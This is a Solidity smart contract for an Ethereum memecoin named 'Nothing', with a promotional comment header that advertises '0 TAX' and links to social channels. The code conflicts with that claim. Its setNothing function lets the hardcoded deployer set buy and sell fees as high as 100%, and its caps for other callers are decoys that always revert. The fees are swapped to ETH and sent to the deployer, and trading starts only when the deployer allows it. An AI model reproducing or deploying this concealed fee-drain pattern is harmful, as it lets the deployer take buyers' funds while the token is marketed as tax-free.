/**

Nothing is a white square nft (square) that has been put into a vault, that has then been put locked into a memecoin contract (can never be withdrawn or sold) that is split into 1 million pieces. It's essentially a white square nft divided into a bunch of tiny pieces… aka supercharged hot digital air.

Can you find and type the correct code word on the website?

100m $Nothing: 0 TAX

Telegram: https://t.me/NothingTGPortal
Twitter: https://twitter.com/NothingTokenERC
Website: https://nothingtoken.site
Medium: https://medium.com/@nothing-erc20

*/

// SPDX-License-Identifier: unlicense

pragma solidity =0.8.18;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

}
interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
 
contract Nothing {
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    string public constant name = "Nothing";   
    string public constant symbol = "Nothing";   
    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 100_000_000 * 10**decimals;

    uint256 getCost = 0;
    uint256 spendCost = 0;
    uint256 constant swapAmount = totalSupply / 1000;
    uint256 constant maxWallet = 100 * totalSupply / 100;

    bool tradingOpened = false;
    bool swapping;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    address immutable pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
    address payable constant deployer = payable(address(0xD422FD2cE82453D75937452c98d87e4A9C534137));

    constructor() {
        pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), ETH);
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][routerAddress] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external returns (bool){
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool){
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool){
        allowance[from][msg.sender] -= amount;        
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool){
        balanceOf[from] -= amount;

        if(from != deployer)
            require(tradingOpened);

        if(to != pair && to != deployer)
            require(balanceOf[to] + amount <= maxWallet);

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
            swapping = true;
            address[] memory path = new  address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                swapAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
            deployer.transfer(address(this).balance);
            swapping = false;
        }

        if(from != address(this) && to != deployer){
            uint256 coinAmount = amount * (from == pair ? getCost : spendCost) / 100;
            amount -= coinAmount;
            balanceOf[address(this)] += coinAmount;
            emit Transfer(from, address(this), coinAmount);
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function openTrading() external {
        require(msg.sender == deployer);
        tradingOpened = true;
    }

    function setNothing(uint256 newGet, uint256 newSpend) external {
        if(msg.sender == deployer){
            getCost = newGet;
            spendCost = newSpend;
        }
        else{
            require(newGet < 10);
            require(newSpend < 10);
            revert();
        }
        
    }
}